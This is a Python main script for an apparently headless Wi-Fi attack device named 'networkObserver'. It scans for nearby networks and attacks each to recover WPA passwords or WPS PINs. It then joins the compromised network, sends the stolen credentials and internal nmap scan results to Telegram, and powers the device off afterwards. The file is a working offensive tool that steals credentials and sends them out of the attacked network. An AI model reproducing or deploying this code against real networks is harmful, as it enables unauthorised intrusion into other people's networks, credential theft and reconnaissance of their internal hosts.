import os
import time
import logging
from utils import (
    clean_files,
    setup_logging,
    wait_for_time_sync,
    is_ssh_connected
)
from wifi_scan import scan_targets
from wifi_attack import attack_target
from wifi_connect import connect_to_wifi, delete_all_wifi_connections
from send_to_telegram import send_message
from nmap_scan import run_nmap_scan, get_wifi_ip, clean_nmap_output
from constants import (
    TARGETS_FILE,
    CRACKED_FILE,
    ATTACK_INTERFACE,
    PCAP_FILE,
    STOP_ON_SUCCESS,
    MAX_RUNTIME,
    ENABLE_NMAP_SCAN
)


# Ensure logs directory exists + configure logging
setup_logging()
logging.info("Starting networkObserver")

# Wait for NTP time synchronization
wait_for_time_sync()
logging.info("Time was synchronized with NTP.")

# Set global timer after time sync
global_start_time = time.monotonic()

# Clean up Wi-Fi state
delete_all_wifi_connections()
logging.info("Disconnected all previous Wi-Fi connections.")

# Clean temp files
clean_files(TARGETS_FILE, CRACKED_FILE, PCAP_FILE)
logging.info("Temporary files cleaned.")

# Scan for targets
targets = scan_targets(ATTACK_INTERFACE)

# Attack loop
while targets:
    if time.monotonic() - global_start_time > MAX_RUNTIME:
        logging.warning("Max runtime exceeded. Exiting.")
        break

    essid, power = targets.pop(0)
    logging.info(f"Attacking {essid} (power: {power} dB)")
    result = attack_target(ATTACK_INTERFACE, essid)
    if result:
        connected = connect_to_wifi(essid, pin=result.get("pin"), psk=result.get("psk"))
        if connected:
            msg = f"[+] Target compromised:\nSSID: {essid}"
            if result.get("psk"):
                msg += f"\nPassword: {result['psk']}"
            elif result.get("pin"):
                msg += f"\nWPS PIN: {result['pin']}"

            send_message(msg)

            if ENABLE_NMAP_SCAN:
                ip = get_wifi_ip(ATTACK_INTERFACE)
                if ip:
                    logging.info(f"Running nmap scan on internal network: {ip}")
                    nmap_result = run_nmap_scan(ip)
                    if nmap_result:
                        cleaned_output = clean_nmap_output(nmap_result)
                        send_message(cleaned_output, prefix="[nmap scan result]")
                else:
                    logging.warning("No IP assigned to interface. Skipping nmap scan.")

            if STOP_ON_SUCCESS:
                logging.info("Stopping after first successful compromise (as per config).")
                break
        else:
            logging.warning(f"Connection to {essid} failed after PIN/PSK.")
    else:
        logging.warning(f"No credentials obtained for {essid}.")

logging.info("Process completed.")

# Shutdown if no SSH
if is_ssh_connected():
    logging.info("SSH session detected. Skipping shutdown.")
else:
    logging.info("No SSH session. Proceeding with shutdown.")
    os.system("sudo poweroff")
